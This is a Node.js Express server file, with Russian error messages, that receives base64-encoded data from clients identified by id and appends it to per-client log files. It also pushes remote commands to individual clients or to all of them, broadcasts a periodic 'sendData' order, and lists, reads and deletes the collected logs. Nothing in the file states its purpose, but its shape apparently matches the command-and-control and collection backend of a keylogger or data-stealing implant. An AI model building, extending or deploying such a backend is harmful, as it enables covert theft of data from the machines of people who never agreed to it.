const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require("path");
const EventEmitter = require('events');

const PORT = 24242;
const DIR_PATH = path.join(__dirname, "../Logs");

const emitter = new EventEmitter();

const server = express();
server.use(cors());
server.use(express.json());

server.listen(PORT, () => {
  console.log(`Server is started on port ${PORT}!`);
});

server.post("/data", (req, res) => {
    const {id, data} = req.body;

    let originData = Buffer.from(data, 'base64').toString('utf8');

    const filePath = path.join(DIR_PATH, `${id}.txt`);

    fs.appendFile(filePath, originData, (err) => {
    if (err) {
        console.error("Ошибка записи в файл:", err);
        return res.status(500).send("Ошибка сервера при записи файла");
    }
    res.status(200).send("OK");
    });
    
});

server.get("/longpull", (req, res) => {
  const clientId = req.query.id;
  if (!clientId) return res.status(400).json({ error: "Client ID is required" });

  const timeout = setTimeout(() => {
    try{
      res.status(204).end();
      emitter.removeListener(`getdata:${clientId}`, sendMes);
    }catch{

    }

  }, 300000); 

  var sendMes = (message) => {
    try{
      if (res.headersSent) return; 
      clearTimeout(timeout);
      res.json(message);
    } catch{
    }
  };

  emitter.once('getdata', sendMes);  
  emitter.once(`getdata:${clientId}`,sendMes)
});

setInterval(() => emitter.emit('getdata', { action: "sendData" }), 610000);

server.post("/command", (req, res) => {
  const {clientId, action} = req.body;
  if(clientId === "all"){
    emitter.emit('getdata', {action});
  }else{
    emitter.emit(`getdata:${clientId}`, {action});
  }
   
   res.status(200).send("OK");
});

server.get("/getLogs", (req, res) => {
    try {
        const files = fs.readdirSync(DIR_PATH)
                      .filter(file => file.endsWith('.txt'))
                      .map(file => file);
        res.json(files);
    } catch (err) {
        console.error('Error reading logs directory:', err);
        res.status(500).json([]);
    }
});

server.get("/getFile", (req, res) => {
  try {
    const filename = req.query.file;
    
    if (!filename) {
        return res.status(400).json({ error: "Filename parameter is required" });
    }

    if (!filename.endsWith('.txt')) {
      return res.status(400).json({ error: "Only .txt files are allowed" });
    }
    
    const safeFilename = path.normalize(filename).replace(/^(\.\.(\/|\\|$))+/, '');
    const filePath = path.join(DIR_PATH, safeFilename);

    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: "File not found" });
    }

    fs.readFile(filePath, 'utf8', (err, data) => {     
        res.json({
            filename: filename,
            content: data
        });
    });

  } catch (error) {
    console.error("Server error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

server.delete('/delFile', (req, res) => {
  try {
    const filename = req.query.file;

    if (!filename) {
      return res.status(400).json({ error: "Filename parameter is required" });
    }

    if (!filename.endsWith('.txt')) {
      return res.status(400).json({ error: "Only .txt files are allowed" });
    }
          
    const safeFilename = path.normalize(filename).replace(/^(\.\.(\/|\\|$))+/, '');
    const filePath = path.join(DIR_PATH, safeFilename);

    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: "File not found" });
    }
    
    fs.unlinkSync(filePath);
    
    res.status(204).end();
  } catch (error) {
      console.error("Server error:", error);
      res.status(500).json({ error: "Internal server error" });
  }
});

